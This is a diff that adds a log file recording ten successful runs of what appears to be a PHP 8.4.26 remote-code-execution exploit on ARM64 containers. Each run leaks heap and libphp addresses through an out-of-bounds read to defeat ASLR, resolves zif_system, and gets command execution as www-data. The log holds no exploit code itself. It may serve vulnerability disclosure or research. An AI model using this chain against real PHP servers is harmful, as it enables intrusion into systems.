@@ -1,0 +1,82 @@
+target: aarch64 PHP 8.4.26 (cli) (built: Oct 21 2026 00:32:44) (NTS)
+image: php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
+===== ARM64 stock fresh-container run 1 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xef846d8a812b -> libphp=0xef846d270000
+      chunk buckets: [('0xef8462a00000', 7495), ('0xef846d800000', 1095), ('0xef846b200000', 87), ('0xef8462800000', 79), ('0xef8463000000', 6)]
+[try 1] A2 + B2: main=0xef846b200000 S=0xef846b2f8398 zif_system=0xef846d69cd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 2 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xf4aaea71812b -> libphp=0xf4aaea0e0000
+      chunk buckets: [('0xf4aadfa00000', 7495), ('0xf4aaea600000', 1095), ('0xf4aae8000000', 87), ('0xf4aadf800000', 79), ('0xf4aae0000000', 6)]
+[try 1] A2 + B2: main=0xf4aae8000000 S=0xf4aae80f8398 zif_system=0xf4aaea50cd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 3 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xebdbc9f3812b -> libphp=0xebdbc9900000
+      chunk buckets: [('0xebdbbf200000', 7495), ('0xebdbc9e00000', 1095), ('0xebdbc7800000', 87), ('0xebdbbf000000', 79), ('0xebdbbf800000', 6)]
+[try 1] A2 + B2: main=0xebdbc7800000 S=0xebdbc78f8398 zif_system=0xebdbc9d2cd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 4 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xfcea113f812b -> libphp=0xfcea10dc0000
+      chunk buckets: [('0xfcea06600000', 7495), ('0xfcea11200000', 1095), ('0xfcea0ec00000', 87), ('0xfcea06400000', 79), ('0xfcea06c00000', 6)]
+[try 1] A2 + B2: main=0xfcea0ec00000 S=0xfcea0ecf8398 zif_system=0xfcea111ecd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 5 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xf9ff47fb812b -> libphp=0xf9ff47980000
+      chunk buckets: [('0xf9ff3d200000', 7495), ('0xf9ff47e00000', 1095), ('0xf9ff45800000', 87), ('0xf9ff3d000000', 79), ('0xf9ff3d800000', 6)]
+[try 1] A2 + B2: main=0xf9ff45800000 S=0xf9ff458f8398 zif_system=0xf9ff47dacd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 6 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xfea348ae812b -> libphp=0xfea3484b0000
+      chunk buckets: [('0xfea33de00000', 7495), ('0xfea348a00000', 1095), ('0xfea346400000', 87), ('0xfea33dc00000', 79), ('0xfea33e400000', 6)]
+[try 1] A2 + B2: main=0xfea346400000 S=0xfea3464f8398 zif_system=0xfea3488dcd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 7 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xe7413a30812b -> libphp=0xe74139cd0000
+      chunk buckets: [('0xe7412f600000', 7495), ('0xe7413a200000', 1095), ('0xe74137c00000', 87), ('0xe7412f400000', 79), ('0xe7412fc00000', 6)]
+[try 1] A2 + B2: main=0xe74137c00000 S=0xe74137cf8398 zif_system=0xe7413a0fcd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 8 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xe9ad8a4a812b -> libphp=0xe9ad89e70000
+      chunk buckets: [('0xe9ad7f600000', 7495), ('0xe9ad8a400000', 1095), ('0xe9ad87e00000', 87), ('0xe9ad7f400000', 79), ('0xe9ad7fc00000', 6)]
+[try 1] A2 + B2: main=0xe9ad87e00000 S=0xe9ad87ef8398 zif_system=0xe9ad8a29cd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 9 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xfcc9de95812b -> libphp=0xfcc9de320000
+      chunk buckets: [('0xfcc9d3c00000', 7495), ('0xfcc9de800000', 1095), ('0xfcc9dc200000', 87), ('0xfcc9d3a00000', 79), ('0xfcc9d4200000', 6)]
+[try 1] A2 + B2: main=0xfcc9dc200000 S=0xfcc9dc2f8398 zif_system=0xfcc9de74cd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 stock fresh-container run 10 =====
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xea1750b6812b -> libphp=0xea1750530000
+      chunk buckets: [('0xea1745e00000', 7495), ('0xea1750a00000', 1095), ('0xea174e400000', 87), ('0xea1745c00000', 79), ('0xea1746400000', 6)]
+[try 1] A2 + B2: main=0xea174e400000 S=0xea174e4f8398 zif_system=0xea175095cd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
